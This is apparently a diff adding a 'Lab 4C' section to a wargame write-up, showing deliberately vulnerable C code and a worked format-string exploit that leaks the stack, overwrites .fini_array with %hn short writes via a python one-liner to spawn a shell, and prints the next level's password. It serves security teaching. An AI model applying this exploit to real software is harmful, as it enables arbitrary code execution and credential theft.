@@ -1069,3 +1069,138 @@ wh0_n33ds_5hchild is exiting...
 ```
 wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd
 ```
+
+## Lab 4C
+
+Let's go a step further in exploiting format string bugs in ELF binaries.
+Here's source-code:
+
+```C
+/*
+ *   Format String Lab - C Problem
+ *   gcc -z execstack -z norelro -fno-stack-protector -o lab4C lab4C.c
+ */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define PASS_LEN 30
+
+int main(int argc, char *argv[])
+{
+    char username[100] = {0};
+    char real_pass[PASS_LEN] = {0};
+    char in_pass[100] = {0};
+    FILE *pass_file = NULL;
+    int rsize = 0;
+
+    /* open the password file */
+    pass_file = fopen("/home/lab4B/.pass", "r");
+    if (pass_file == NULL) {
+        fprintf(stderr, "ERROR: failed to open password file\n");
+        exit(EXIT_FAILURE);
+    }
+
+    /* read the contents of the password file */
+    rsize = fread(real_pass, 1, PASS_LEN, pass_file);
+    real_pass[strcspn(real_pass, "\n")] = '\0';  // strip \n
+    if (rsize != PASS_LEN) {
+        fprintf(stderr, "ERROR: failed to read password file\n");
+        exit(EXIT_FAILURE);
+    }
+
+    /* close the password file */
+    fclose(pass_file);
+
+    puts("===== [ Secure Access System v1.0 ] =====");
+    puts("-----------------------------------------");
+    puts("- You must login to access this system. -");
+    puts("-----------------------------------------");
+
+    /* read username securely */
+    printf("--[ Username: ");
+    fgets(username, 100, stdin);
+    username[strcspn(username, "\n")] = '\0';    // strip \n
+
+    /* read input password securely */
+    printf("--[ Password: ");
+    fgets(in_pass, sizeof(in_pass), stdin);
+    in_pass[strcspn(in_pass, "\n")] = '\0';      // strip \n
+
+    puts("-----------------------------------------");
+
+    /* log the user in if the password is correct */
+    if(!strncmp(real_pass, in_pass, PASS_LEN)){
+        printf("Greetings, %s!\n", username);
+        system("/bin/sh");
+    } else {
+        printf(username);
+```
+
+Ok, here we observe, that if we don't use valid username for login, our input gets printed to stdout via ```printf()```. The major bug is that ```printf()``` will be supplied with username without using any format string for that. As a result we will be able to leak memory info from stack with providing our own format-string specifiers while being asked for correct username:
+
+```
+$ ./lab4C
+===== [ Secure Access System v1.0 ] =====
+-----------------------------------------
+- You must login to access this system. -
+-----------------------------------------
+--[ Username: %x%x%x%x
+--[ Password:
+-----------------------------------------
+bffff5721e804a0080 does not have access!
+```
+
+So after testing a little bit, we observe that number of octets in stdout after providing crafter format-string is quite limited. After playing aroud with using direct parameter access, we can determine correct number of arguments to be 37:
+
+```
+$ ./lab4C
+===== [ Secure Access System v1.0 ] =====
+-----------------------------------------
+- You must login to access this system. -
+-----------------------------------------
+--[ Username: AAAA%37$x
+--[ Password:
+-----------------------------------------
+AAAA41414141 does not have access!
+```
+
+In source code, there's a line containing a call to libc's ```system()``` built_in. Interesting... Can we overwrite any address and mangle control-flow to call ```system()```. Yes we can! The program contains a section called "fini_array":
+
+```
+$ rabin2 -is lab4C | grep fini
+vaddr=0x08049de4 paddr=0x00001de4 ord=033 fwd=NONE sz=0 bind=LOCAL type=OBJECT name=__do_global_dtors_aux_fini_array_entry
+```
+ Let's check if it's writable by the way:
+
+ ```
+$ readelf --sections lab4C | grep "fini"
+  [14] .fini             PROGBITS        08048ba4 000ba4 000014 00  AX  0   0  4
+  [19] .fini_array       FINI_ARRAY      08049de4 000de4 000004 00  WA  0   0  4
+ ```
+
+ The section is writable. If we would write address of ```system()``` call in binary's .text section to fini_array, shell will be spawned after we exited programs main-routine.
+There are also multiple ways to achieve that with printf's %n parameter. I prefer the so called "short-write"-method, which overwrites two bytes of target address at time. This has the nice advantage of speeding up the process of overwriting an addressm as we need only only two operation sto do this:
+
+* <overwrite address><overwrite-address+2>%<2 LSB target-address(lowest two bytes in decimal)>c$<argnum1>hn%<2 MSB target address(highest two bytes in decimal minus bytes already written)>$<argnum1+1>$hn
+
+In that special case our payload will look like this:
+
+```
+$ rax2 0x8aeb - 8 
+35555
+$ rax2 0x10804-0x8aeb
+32025
+(python -c 'a="\xe4\x9d\x04\x08\xe6\x9d\x04\x08%35555x%37$hn%32025x%38$hn\npassword";print a'; cat) | ./lab4C
+cat /home/lab4B/.pass
+bu7_1t_w4sn7_brUt3_f0rc34b1e!
+```
+
+## Pass Lab4B
+
+```
+bu7_1t_w4sn7_brUt3_f0rc34b1e!
+```
+
+
